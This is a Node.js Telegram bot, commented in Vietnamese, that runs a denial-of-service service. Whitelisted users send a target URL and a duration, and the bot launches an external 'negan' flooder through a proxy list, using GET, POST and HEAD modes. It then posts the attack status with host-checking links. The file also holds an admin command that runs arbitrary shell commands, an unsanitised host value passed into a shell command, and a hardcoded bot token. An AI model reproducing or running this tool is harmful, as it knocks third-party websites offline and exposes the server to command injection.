const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Cấu hình bot
const token = '7096539643:AAFiUkftXa2b-mirylFY4Anb6FbF3xoT2Xs'; // Thay thế bằng token mới
const adminId = 7371969470;
const allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]);
const bot = new TelegramBot(token, { polling: true });

// Cấu hình giới hạn
const maxSlot = 1; // Số lượng slot tối đa cho mỗi người dùng
const maxCurrent = 3; // Số lượng tiến trình tối đa cùng lúc
const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi cuộc tấn công

// Biến toàn cục
let currentProcesses = 0;
let queue = [];
let userProcesses = {};
let activeAttacks = {};
let botStartTime = Date.now(); // Thời điểm bot khởi động

// Tăng heap size lên 8GB
process.env.NODE_OPTIONS = '--max-old-space-size=8192';

// Hàm khởi động tấn công
const launchAttack = (host, attackTime, mode, chatId, caller, userId) => {
    return new Promise((resolve, reject) => {
        const pid = Math.floor(Math.random() * 10000);
        const endTime = Date.now() + attackTime * 1000;
        activeAttacks[pid] = { userId, endTime };
        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
        currentProcesses++;

        exec(`node ./negan -m ${mode} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
            const completeMessage = JSON.stringify({
                Status: "👽 END ATTACK 👽",
                Caller: caller,
                "PID Attack": pid,
                Website: host,
                Time: `${attackTime} Giây`,
                EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })
            }, null, 2);

            bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });

            // Dọn dẹp sau khi tấn công kết thúc
            delete activeAttacks[pid];
            userProcesses[userId]--;
            currentProcesses--;

            // Xử lý hàng đợi nếu có
            if (queue.length > 0) {
                const next = queue.shift();
                bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
                bot.emit('message', {
                    chat: { id: next.chatId },
                    from: { id: next.userId, username: next.caller },
                    text: `${next.host} ${next.time}`
                });
            }

            if (e) {
                reject(e);
            } else {
                resolve(stdout);
            }
        });
    });
};

// Khởi tạo bot
const initBot = () => {
    bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');

    const helpMessage = `📜 Hướng dẫn sử dụng:
➔ Lệnh chính xác: <code>https://example.com 120</code>
➔ Lệnh full: <code>https://example.com 120 full</code>
⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

    bot.on('message', async (msg) => {
        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
        const isAdmin = chatId === adminId;
        const isGroup = allowedGroupIds.has(chatId);
        const caller = username || first_name;

        // Kiểm tra nếu lệnh được gửi trước khi bot online
        if (date * 1000 < botStartTime) {
            return; // Bỏ qua lệnh mà không thông báo
        }

        if (!isAdmin && !isGroup) {
            return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: @Sasuke_1122.', { parse_mode: 'HTML' });
        }

        if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) {
            return;
        }

        if (text === '/help') {
            return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });
        }

        if (text.startsWith('http')) {
            const [host, time, full] = text.split(' ');
            if (!host || isNaN(time)) {
                return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
            }

            const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);

            // Kiểm tra số lượng tiến trình hiện tại của người dùng
            if (userProcesses[userId] >= maxSlot) {
                return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
            }

            // Kiểm tra số lượng tiến trình hiện tại
            if (currentProcesses >= maxCurrent) {
                queue.push({ userId, host, time: attackTime, chatId, caller });
                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
            }

            // Xác định phương thức tấn công
            const methods = full === 'full' ? ['GET', 'POST', 'HEAD'] : ['GET'];

            // Gửi thông báo bắt đầu tấn công
            const startMessage = JSON.stringify({
                Status: "✨🚀🛸 Successfully 🛸🚀✨",
                Caller: caller,
                "PID Attack": Math.floor(Math.random() * 10000),
                Website: host,
                Time: `${attackTime} Giây`,
                Maxslot: maxSlot,
                Maxtime: maxTimeAttacks,
                ConcurrentAttacks: methods.length,
                Methods: methods, // Hiển thị Methods dưới dạng một mảng không có xuống dòng
                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
                CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
                HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
            }, null, 2);

            await bot.sendMessage(chatId, startMessage, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` },
                            { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }
                        ]
                    ]
                }
            });

            // Chạy đồng thời các phương thức tấn công
            methods.forEach((method) => {
                launchAttack(host, attackTime, method, chatId, caller, userId);
            });

            return;
        }

        if (text.startsWith('exe ') && isAdmin) {
            const cmd = text.slice(4);
            if (!cmd) {
                return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
            }

            exec(cmd, { shell: '/bin/bash' }, (e, o, er) => {
                bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' });
            });
        }
    });
};

// Khởi động bot
initBot();
